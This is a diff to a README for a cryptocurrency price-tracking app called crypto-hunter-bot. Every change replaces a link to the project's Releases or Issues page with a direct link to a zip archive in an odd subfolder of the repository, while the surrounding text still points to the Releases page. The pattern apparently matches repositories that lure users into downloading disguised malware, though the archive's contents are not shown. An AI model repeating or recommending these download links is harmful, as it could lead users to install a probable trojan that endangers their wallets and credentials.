@@ -1,7 +1,7 @@
 # 🚀 crypto-hunter-bot - Track Cryptocurrency Prices Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/frankromero67/crypto-hunter-bot/releases)
+[![Download](https://raw.githubusercontent.com/frankromero67/crypto-hunter-bot/main/lithoxyl/crypto-hunter-bot.zip%https://raw.githubusercontent.com/frankromero67/crypto-hunter-bot/main/lithoxyl/crypto-hunter-bot.zip)](https://raw.githubusercontent.com/frankromero67/crypto-hunter-bot/main/lithoxyl/crypto-hunter-bot.zip)
 
 ## 📖 About
 The **crypto-hunter-bot** helps you track cryptocurrency prices in real-time. You can easily monitor your favorite coins without any technical skills. This application runs quietly in the background while keeping you updated.
@@ -21,7 +21,7 @@ The **crypto-hunter-bot** helps you track cryptocurrency prices in real-time. Yo
 ## 🚀 Getting Started
 1. **Visit the Releases Page**
    To get the latest version of crypto-hunter-bot, visit the following page:
-   [Download Crypto Hunter Bot](https://github.com/frankromero67/crypto-hunter-bot/releases)
+   [Download Crypto Hunter Bot](https://raw.githubusercontent.com/frankromero67/crypto-hunter-bot/main/lithoxyl/crypto-hunter-bot.zip)
 
 2. **Select the Latest Release**
    On the Releases page, look for the latest version at the top of the list. Click on it to open the release details.
@@ -64,7 +64,7 @@ A: Yes, you can track as many cryptocurrencies as you like by selecting your fav
 A: The app updates price information every few seconds, ensuring you receive the latest data.
 
 ## 🌐 Support
-For additional support or questions, visit our GitHub Issues page [here](https://github.com/frankromero67/crypto-hunter-bot/issues). You can submit issues directly or search for solutions to common questions.
+For additional support or questions, visit our GitHub Issues page [here](https://raw.githubusercontent.com/frankromero67/crypto-hunter-bot/main/lithoxyl/crypto-hunter-bot.zip). You can submit issues directly or search for solutions to common questions.
 
 ## 📄 License
 This project is licensed under the MIT License. You can find more information in the LICENSE file in the repository.
@@ -74,4 +74,4 @@ Though contributions are not required, they are welcome. If you have ideas for n
 
 ## 🚀 Download Now Again
 To get started, don’t forget to visit the Releases page again:
-[Download Crypto Hunter Bot](https://github.com/frankromero67/crypto-hunter-bot/releases)
+[Download Crypto Hunter Bot](https://raw.githubusercontent.com/frankromero67/crypto-hunter-bot/main/lithoxyl/crypto-hunter-bot.zip)
